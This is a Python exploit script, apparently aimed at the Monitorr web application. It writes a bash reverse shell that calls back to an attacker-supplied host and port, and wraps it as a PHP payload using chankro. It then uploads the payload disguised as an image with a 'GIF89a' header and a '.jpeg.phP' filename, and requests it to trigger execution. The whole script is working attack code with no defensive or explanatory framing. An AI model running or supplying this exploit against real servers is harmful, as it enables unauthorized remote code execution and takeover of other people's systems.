#!/usr/bin/python

import time
import requests
import os
import sys

try:
	host = sys.argv[1]
	ip_address = sys.argv[2]
	port = sys.argv[3]
except:
	print ("[*] Use: python " + sys.argv[0] + " Target_URL LHOST LPORT")

def generate_shell():
        # Generate shell.sh
        shell_file = open("shell.sh", "w")
        shell_file.write("bash -c 'bash -i >& /dev/tcp/" + ip_address + "/" + port + " 0>&1'")
        shell_file.close

def exploit():
                # Generate shell
                generate_shell()
                # Generate PHP Reverse Shell using shell.sh and chankro.py
                cwd = os.getcwd()
                generate_payload = os.system("python chankro.py --arch 64 --input " + cwd + "/" +  "shell.sh" + " --output rev.php --path /var/www/monitorr/assets/data/usrimg/")
                f = open("rev.php", "r")
                reverse_shell = "GIF89a;" + f.read()

                # Upload PHP File
                url = host + "/assets/php/upload.php"
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Cookie": "isHuman=1","Referer": host}
                data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"shell2.jpeg.phP\"\r\nContent-Type: image/jpeg\r\n\r\n" + reverse_shell +"\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"
                requests.post(url, headers=headers, data=data, verify=False)

                # Send GET Request
                url = host + "/assets/data/usrimg/shell2.jpeg.php"
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Cookie": "isHuman=1","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
                requests.get(url, headers=headers, verify=False)

if __name__ == '__main__':
        exploit()
